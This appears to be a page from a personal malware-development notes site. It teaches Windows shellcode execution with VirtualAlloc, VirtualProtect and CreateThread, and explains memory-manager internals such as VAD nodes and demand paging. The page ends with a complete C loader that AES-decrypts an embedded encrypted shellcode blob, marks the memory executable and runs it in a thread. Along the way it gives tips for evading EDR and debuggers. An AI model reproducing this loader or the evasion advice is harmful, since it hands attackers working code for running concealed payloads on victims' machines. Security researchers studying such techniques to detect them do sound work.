# https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation

For the complete documentation index, see [llms.txt](https://www.udayxd.xyz/llms.txt). This page is also available as [Markdown](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation.md).

## Shellcode Execution via Thread Creation[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#shellcode-execution-via-thread-creation)

### Overview[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#overview)

This module will discuss one of the simplest ways to execute shellcode via the creation of a new thread. Although this technique is simple, it's crucial to understand how it works as it lays the groundwork for more advanced shellcode execution methods.

The method discussed in this module utilizes `VirtualAlloc`, `VirtualProtect` and `CreateThread` Windows APIs. It's important to note that this method is by no means a stealthy technique and EDRs will almost certainly detect this simple shellcode execution technique.

* * *

### Required Windows APIs[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#required-windows-apis)

API

Purpose

`VirtualAlloc`

Allocates memory which will be used to store the payload

`VirtualProtect`

Change the memory protection of the allocated memory to be executable in order to execute the payload

`CreateThread`

Creates a new thread that runs the payloads

* * *

### 1\. Allocating Memory - `VirtualAlloc`[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-1.-allocating-memory-virtualalloc)

The `VirtualAlloc` WinAPI function looks like the following based on its documentation:

Copy

```
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
  [in]           DWORD  flAllocationType,   // The type of memory allocation
  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated
);
```

#### Parameters[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#parameters)

`lpAddress` Starting address of the region to allocate. If the memory is being reserved, the specified address is rounded down to the next 64-kilobyte boundary. If the memory is already reserved and is being committed, the address is rounded down to the next page boundary. To determine the size of a page on the host computer, use the `GetSystemInfo` function. If this parameter is NULL, the system determines where to allocate the region.

`dwSize` Size of the region, in bytes. If the `lpAddress` parameter is NULL, this value is rounded up to the next page boundary. Otherwise, the allocated pages include all pages containing one or more bytes in the range from `lpAddress` to (`lpAddress` \+ `dwSize`). This means that a 2-byte range straddling a page boundary causes both pages to be included in the allocated region.

`flAllocationType` Type of memory allocation. This parameter must contain one of the following values.

* * *

### 2\. Allocation Type Flags[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-2.-allocation-type-flags)

#### 2.1 `MEM_RESERVE`[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-2.1-mem_reserve)

**What is**`MEM_RESERVE` **?**

When you call `VirtualAlloc` with `MEM_RESERVE`, you are telling Windows to claim a chunk of virtual address space for your process without actually giving you any physical RAM yet. Think of it like calling dibs on a parking spot. You have marked the spot as yours, but your car is not there yet.

The reservation records two things: how much space you want, and what protection flags you plan to use. At this point, no RAM is backing this memory, and no Page Table Entries exist anywhere. All your process gets back is a number, a virtual address that acts as your claim ticket for this reserved range.

**Where Does**`MEM_RESERVE` **Store This Information?**

This is where the VAD tree comes in. VAD stands for Virtual Address Descriptor. The Windows Memory Manager keeps a VAD tree in kernel memory for every running process. Your process cannot see it or touch it directly. When you call `VirtualAlloc` with `MEM_RESERVE`, the Memory Manager creates a new node in your process's VAD tree.

Here is what a real VAD node looks like when dumped from WinDbg:

Copy

```
kd> !vad 824bc2f8

VAD @ 824bc2f8
  Start VPN:         7ffb0  End VPN:    7ffd3  Control Area:  827f1208
  First ProtoPte: e1008500  Last PTE e100858c  Commit Charge         0 (0.)
  Secured.Flink          0  Blink           0  Banked/Extend:        0 Offset 0
   ViewShare NoChange READONLY
```

Breaking this down:

Field

Meaning

`VAD @ 824bc2f8`

Address in kernel memory where this VAD node lives. The Memory Manager uses this address to find and update the node quickly.

`Start VPN: 7ffb0` / `End VPN: 7ffd3`

Defines which range of virtual addresses this reservation covers. VPN = Virtual Page Number. Multiply by 4096 to get the actual address. `7ffb0 * 4096 = 0x7FFB0000`, `7ffd3 * 4096 = 0x7FFD3000`.

`Control Area`

Points to another kernel structure. For file-backed memory like EXE or DLL sections, this points to file mapping info. For private allocations like shellcode buffers, this looks different.

`Commit Charge: 0`

**Most important field.** Zero means no physical RAM has been allocated yet. This is the entire point of `MEM_RESERVE`. It is just a reservation.

`ViewShare NoChange READONLY`

Shows the protection flags. Yours will likely differ depending on what you passed in.

The VAD tree is the Memory Manager's master catalog of your process's virtual address space. Every time Windows needs to understand what is going on with a particular address in your process, it checks this tree.

**What Your Process Gets Back**

After the VAD node is created, your process receives one thing: a virtual address. Just a number like `0x10000000`. Your process stores this in a pointer variable. This number is your claim ticket, and you will pass it back later when you want to commit or free this memory.

One thing that trips people up: the virtual address is not a pointer to the VAD node. It is just a key. The Memory Manager uses this key to look up the right VAD node internally. Your process has no idea where the VAD node is, what physical page will eventually back this memory, or anything else at the kernel level. It just knows the number.

That is all `MEM_RESERVE` does. It creates a VAD node in kernel memory, records your size and protection info, and hands you a virtual address. No physical RAM is allocated. No PTEs are created. You cannot read or write to this memory yet, and if you try, you will get an access violation.

Copy

```
LPVOID pMem = VirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_READWRITE);
// Memory Manager creates a VAD node, Commit Charge = 0
// pMem is now something like 0x10000000

// You CANNOT use this memory yet
// char x = *(char*)pMem; -> ACCESS VIOLATION
```

`MEM_RESERVE` **Flow**

- Your process calls `VirtualAlloc` with `MEM_RESERVE` and the requested size.

- This triggers a syscall. CPU switches from user mode to kernel mode.

- The System Service Dispatcher inside `ntoskrnl.exe` routes the call to the Memory Manager.

- The Memory Manager scans your process's VAD tree to find a free virtual address range big enough for your request.

- It creates a new VAD node with: start and end VPN, Commit Charge = 0, state = RESERVED, and your protection flags.

- It returns the starting virtual address to your process.

- Your process stores this in a pointer variable.


> No physical RAM allocated. No PTEs created.

* * *

#### 2.2 `MEM_COMMIT`[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-2.2-mem_commit)

**What is**`MEM_COMMIT` **?**

Once you have reserved virtual address space, `MEM_COMMIT` is the next step. When you call `VirtualAlloc` with `MEM_COMMIT`, you are telling the Memory Manager to prepare that reserved range for actual use.

There are two ways to call this, and both end up at the same result.

**Scenario 1: Two-Step Approach**

Copy

```
// Step 1: Reserve
LPVOID pMem = VirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_READWRITE);
// VAD node created, Commit Charge = 0
// pMem = 0x10000000

// Step 2: Commit
VirtualAlloc(pMem, 4096, MEM_COMMIT, PAGE_READWRITE);
```

When you call `MEM_COMMIT`, the Memory Manager takes that address, finds the corresponding VAD node in your process's VAD tree, and sets up Page Table Entries for that range. The PTEs are created in a special state called **demand zero**. This means the PTE exists, but no physical page has been assigned yet.

Physical RAM is **NOT** allocated at commit time. This is a common misconception. What actually happens is this: finds no physical page assigned, and fires a page fault. The Memory Manager's page fault handler then jumps in, finds a free physical page, zeroes it out (to make sure no leftover data from a previous process is visible), maps it to that PTE, and resumes your code. This mechanism is called **demand paging**.

This matters practically. If you commit 1GB of memory but only ever write to 10MB of it, only around 10MB of physical RAM is actually consumed.

After the VAD node gets updated, the commit charge increments by the number of pages committed, and the state changes from RESERVED to COMMITTED.

**Scenario 2: One-Step Approach**

This is the most common pattern in malware development.

Copy

```
LPVOID pMem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Internally this is the same two steps, just done back to back in a single call. The Memory Manager reserves the range first, then immediately commits it. From your process's perspective it is one API call that gives you a fully usable pointer.

**After Commit: Writing Your Payload**

Once memory is committed, you can write to it.

Copy

```
memcpy(pMem, shellcode, shellcodeSize);
```

When `memcpy` writes to `pMem`, the CPU's Memory Management Unit translates the virtual address using the PTE. If this is the first write to that page, a page fault fires, physical RAM gets assigned and zeroed, and then the write goes through. If the page was already faulted in, the write goes straight to the physical page. Either way, your shellcode bytes end up in physical RAM.

If your shellcode is larger than 4KB, it spans multiple pages, and each page has its own PTE and its own physical page assigned on first access.

* * *

#### 2.3 Other `VirtualAlloc` Flags[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-2.3-other-virtualalloc-flags)

`MEM_RESET`

`MEM_RESET` tells the Memory Manager that the contents of a memory region are no longer useful and should not be written to the paging file if memory gets tight. The physical pages stay allocated and the memory stays committed, but Windows is free to discard the contents if it needs to reclaim RAM.

`MEM_RESET` does not zero the memory. Your data stays where it is until something overwrites it. You cannot combine it with other allocation flags, and it fails on file-mapped memory (except the paging file). The `fProtect` parameter is ignored, but you still need to pass a valid value like `PAGE_NOACCESS`.

In malware development this is rarely used. If you want clean memory, just decommit and recommit.

`MEM_LARGE_PAGE`

Normally Windows uses 4KB pages. `MEM_LARGE_PAGE` switches to 2MB pages. Larger pages can improve performance because the CPU's Translation Lookaside Buffer (TLB) can cover more memory with fewer entries, which means fewer TLB misses.

The catch is that your allocation size and alignment must be multiples of the large page minimum, which you can query with `GetLargePageMinimum()`. You also need the "Lock Pages in Memory" privilege, which is not granted by default.

From an evasion standpoint, fewer pages means less surface area for security products that scan page by page. But the privilege requirement makes this awkward to use in practice.

`MEM_PHYSICAL`

This flag is for Address Windowing Extensions (AWE), which lets 32-bit applications access more than 4GB of physical RAM. It must be combined with `MEM_RESERVE` and nothing else. Extremely specialized and unlikely to come up in most maldev work.

`MEM_TOP_DOWN`

This flag tells the Memory Manager to allocate memory at the highest available address in your process's virtual address space. On 64-bit Windows this puts you near `0x7FFFFFFF`. Some security tools scan memory from low to high addresses, so placing a payload high in the address space can help avoid early detection. Whether this actually helps depends heavily on the specific tool.

`MEM_WRITE_WATCH`

When combined with `MEM_RESERVE`, this flag tells the Memory Manager to track which pages in the allocation get written to. You can then call `GetWriteWatch()` to retrieve the list of written page addresses, and `ResetWriteWatch()` to clear the tracking.

In malware development this is occasionally used for anti-debugging. You can detect if a debugger has written to your shellcode pages, or verify that self-modifying code is working as expected.

* * *

### 3\. Changing Memory Protection - `VirtualProtect`[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-3.-changing-memory-protection-virtualprotect)

Before executing shellcode, you need to change the memory protection. If you allocated with `PAGE_READWRITE`, the memory is not executable. To execute, you need `PAGE_EXECUTE_READ` or `PAGE_EXECUTE_READWRITE`.

`VirtualProtect` handles this:

Copy

```
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,      // Base address of the region to change
  [in]  SIZE_T dwSize,         // Size of the region in bytes
  [in]  DWORD  flNewProtect,   // New protection flags
  [out] PDWORD lpflOldProtect  // Receives the old protection value
);
```

> A common pattern is to allocate with `PAGE_READWRITE`, write your shellcode with `memcpy`, then call `VirtualProtect` to flip it to `PAGE_EXECUTE_READ` before executing. This avoids having a region that is simultaneously writable and executable, which is a common EDR detection signal.

* * *

### 4\. Payload Execution[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-4.-payload-execution)

#### 4.1 Via `CreateThread`[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-4.1-via-createthread)

Finally, the payload is executed by creating a new thread using the `CreateThread` Windows API function and passing `pShellcodeAddress` which is the shellcode address.

The `CreateThread` WinAPI function looks like the following based on its documentation:

Copy

```
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,  // Set to NULL - optional
  [in]            SIZE_T                  dwStackSize,         // Set to 0 - default
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,      // Pointer to a function to be executed by the thread, in our case its the base address of the payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,         // Pointer to a variable to be passed to the function executed (set to NULL - optional)
  [in]            DWORD                   dwCreationFlags,     // Set to 0 - default
  [out, optional] LPDWORD                 lpThreadId           // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)
);
```

#### 4.2 Via Function Pointer[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-4.2-via-function-pointer)

Alternatively, there is a simpler way to run the shellcode without using the `CreateThread` Windows API. In the example below, the shellcode is casted to a `VOID` function pointer and the shellcode is executed as a function pointer. The code essentially jumps to the `pShellcodeAddress` address.

Copy

```
(*(VOID(*)()) pShellcodeAddress)();
```

That is equivalent to running the code below:

Copy

```
typedef VOID (WINAPI* fnShellcodefunc)();       // Defined before the main function
fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
pShell();
```

* * *

### 5\. Full Example Code[Direct link to heading](https://www.udayxd.xyz/notes/maldev/shellcode-execution-via-thread-creation\#id-5.-full-example-code)

Copy

```
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "aes.h"

#define KEYSIZE 32
#define IVSIZE 16

BOOL PaddBuffer(_In_ PBYTE InputBuffer, _In_ SIZE_T InputBufferSize, _Out_ PBYTE* OutputPaddedBuffer, _Out_ SIZE_T* OutputPaddedSize) {
	PBYTE PaddedBuffer = NULL;
	SIZE_T PaddedSize = NULL;

	//calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	//allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	//cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);

	//copying the old buffer to the new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);

	//saving result:
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

}
// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}
	printf("};\n\n\n");
}

//Decryption:
unsigned char pKey[] = {
		0x58, 0x9B, 0xBD, 0x05, 0xD2, 0x68, 0xDF, 0x43, 0x70, 0xCD, 0x36, 0xE9, 0xB9, 0x83, 0xAA, 0x15,
		0xE6, 0x2A, 0x63, 0x15, 0x99, 0x33, 0x27, 0x73, 0xCB, 0xFD, 0xE3, 0x2E, 0x06, 0x3E, 0x87, 0x4B };

unsigned char pIv[] = {
		0x6D, 0x9E, 0x71, 0x37, 0xD9, 0x04, 0x7E, 0x8F, 0x8E, 0xF2, 0xD0, 0x86, 0x29, 0xDB, 0x1E, 0xBE };

unsigned char CipherText[] = {
		0xC4, 0x0F, 0xF4, 0x45, 0x97, 0xF1, 0x8E, 0xA0, 0xEC, 0x6A, 0x86, 0xB0, 0xC8, 0x89, 0xDC, 0xB1,
		0xF1, 0x92, 0xD9, 0x32, 0xED, 0x95, 0x82, 0x6E, 0xF7, 0x07, 0xEC, 0x75, 0xC8, 0x2F, 0x68, 0xC3,
		0x41, 0x8B, 0x29, 0xA3, 0xA3, 0x80, 0x06, 0xF4, 0x70, 0x44, 0x90, 0x8F, 0x8B, 0xEE, 0xDF, 0xE5,
		0x17, 0xCE, 0x28, 0x64, 0xC1, 0xDA, 0x45, 0x88, 0xE0, 0xF4, 0xF2, 0x3D, 0x96, 0x4D, 0xF6, 0x24,
		0x96, 0xEC, 0x06, 0xC2, 0xED, 0x51, 0x23, 0x01, 0xFE, 0x57, 0xD7, 0x03, 0x50, 0xFB, 0x3D, 0x78,
		0xEC, 0xC2, 0x5E, 0x5B, 0x51, 0x0F, 0x77, 0x68, 0x62, 0x7E, 0x43, 0x10, 0x94, 0x15, 0x43, 0x8B,
		0x12, 0x34, 0xD9, 0x31, 0x97, 0x8D, 0xA9, 0x1D, 0x9A, 0x09, 0x50, 0x01, 0xD7, 0x0F, 0x07, 0x24,
		0x24, 0x4F, 0x57, 0x57, 0x91, 0xCC, 0x87, 0x78, 0x2A, 0x89, 0x53, 0xF4, 0x07, 0x6D, 0xE6, 0xC3,
		0x18, 0x5B, 0x0B, 0xD8, 0xCF, 0x7F, 0x08, 0xDF, 0x57, 0xB0, 0x05, 0x42, 0xA4, 0x46, 0x99, 0x8D,
		0xC8, 0xF5, 0x08, 0x9D, 0xD5, 0x84, 0xAD, 0x71, 0x23, 0x21, 0xF2, 0x98, 0xE7, 0xE2, 0xA7, 0xDD,
		0x8F, 0x0A, 0x88, 0x2C, 0x1B, 0x22, 0xDB, 0x6B, 0x09, 0x44, 0xC1, 0xC3, 0x68, 0xF4, 0xC6, 0x5B,
		0x8C, 0xA5, 0xB8, 0x07, 0xE0, 0x1D, 0xB7, 0x28, 0x70, 0x41, 0xCF, 0xE8, 0x76, 0x18, 0xC8, 0xC9,
		0xAF, 0x4B, 0x3C, 0x3C, 0xA1, 0xF9, 0x16, 0x5E, 0xEB, 0x34, 0x86, 0xD0, 0x19, 0x02, 0x94, 0x8A,
		0x20, 0x96, 0xBC, 0x8E, 0x05, 0xEB, 0x75, 0x76, 0x2A, 0x4D, 0xF2, 0x56, 0x81, 0xDF, 0xFE, 0x02,
		0x1B, 0x53, 0x57, 0x2E, 0x2B, 0xCA, 0x9A, 0x0B, 0x05, 0xFE, 0x9E, 0xF3, 0xCB, 0x13, 0xA2, 0xED,
		0x27, 0xE0, 0x51, 0x50, 0xEB, 0xF0, 0xFB, 0x72, 0x04, 0xC8, 0x5D, 0x7D, 0x2E, 0x9A, 0x49, 0xCB,
		0x56, 0x07, 0x54, 0xA2, 0xDA, 0x3E, 0x3B, 0x4A, 0xDE, 0xFC, 0x23, 0x0F, 0x86, 0x42, 0x5F, 0xF3,
		0x04, 0x5B, 0x76, 0xFB, 0x25, 0x38, 0x3B, 0xF2, 0xBA, 0x2F, 0xFD, 0xCA, 0xFF, 0xB2, 0x1F, 0xA0 };

int main() {
	//Struct needed
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, pKey, pIv);

	LPVOID memoryalloc = VirtualAlloc(NULL, sizeof(CipherText), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("The Allocated Memory Address: 0x%p \n", memoryalloc);
	getchar();

	//Decrypting
	AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));

	// Just a debug fucntion to see that did shellcode got Decrypted or not
	//PrintHexData("PlainText", CipherText, sizeof(CipherText));

	memcpy(memoryalloc, CipherText, sizeof(CipherText));
	printf("the shell code is copped to the momory region\n");
	getchar();

	DWORD Protection = NULL;

	if (!VirtualProtect(memoryalloc, sizeof(CipherText), PAGE_EXECUTE_READWRITE, &Protection)) {
		printf("VirtualProtect Failed With Error : %d \n", GetLastError());
		return -1;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Create thread to execute shellcode
	printf("Press <Enter> To Run Shellcode...\n");
	getchar();

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memoryalloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		VirtualFree(memoryalloc, 0, MEM_RELEASE);
		return -1;
	}
	printf("[+] Thread created successfully\n");

	//  Wait for thread to finish
	WaitForSingleObject(hThread, INFINITE);

	//Clean up
	printf("[#] Press <Enter> To Free Memory and Exit...\n");
	getchar();

	if (VirtualFree(memoryalloc, 0, MEM_RELEASE)) {
		printf("[+] Memory freed successfully\n");
	}
	else {
		printf("[!] VirtualFree Failed With Error: %d\n", GetLastError());
	}

	CloseHandle(hThread);

	return 0;
}
```

[PreviousFunction Stomping Injection](https://www.udayxd.xyz/notes/maldev/function-stomping-injection) [NextProcess Enumeration with NtAPI](https://www.udayxd.xyz/notes/maldev/process-enumeration-with-ntapi)

Last updated 1 month ago